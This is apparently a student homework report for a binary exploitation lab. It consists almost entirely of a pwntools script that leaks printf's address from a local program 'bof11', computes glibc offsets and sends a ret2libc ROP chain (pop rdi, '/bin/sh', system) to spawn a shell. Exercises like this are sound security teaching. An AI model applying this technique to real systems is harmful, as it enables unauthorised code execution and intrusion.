# Report. HW9.

참고.

- `RET`와 `buf` 사이의 거리 = 18.
- 

<details><summary>exp_bof11.py</summary>
<p>

```python
from pwn import *

p = process('./bof11')

p.recvuntil('printf() address : ')
printf_addr = int(p.recvuntil('\n').decode('UTF-8').strip(), 16)

glibc_offset = {}
glibc_offset['poprdi'] = 0x0000000000021102
glibc_offset['printf'] = -(0x00007faaa2c65000 - 0x00007faaa2cba800)
glibc_offset['binsh']  = -(0x00007faaa2c65000 - 0x00007faaa2df1d57)
glibc_offset['system'] = -(0x00007ffff7a0d000 - 0x00007ffff7a52390)

glibc_addr = printf_addr - glibc_offset['printf']
system_addr = glibc_addr + glibc_offset['system']
binsh_addr = glibc_addr + glibc_offset['binsh']
poprdi_ret = glibc_addr + glibc_offset['poprdi']

print(hex(printf_addr))
print(hex(glibc_addr))
print(hex(system_addr))
print(hex(binsh_addr))
print(hex(poprdi_ret))

payload = ('x' * 18).encode() # 18 : distance between RET and 'buf'
payload += p64(poprdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.send(payload)
p.interactive()
   
'''
glibc(of one bof11) @ 0x00007faaa2c65000.
printf(of one bof11) @ 0x00007faaa2cba800.
/bin/sh(of one bof11) @ 0x00007faaa2df1d57.

"pop rdi ; ret" @ 0x0000000000021102.

glibc(of bof9) @ 0x00007ffff7a0d000
system(of bof9) @ 0x00007ffff7a52390
'''

```
</p></details>

# -- END --

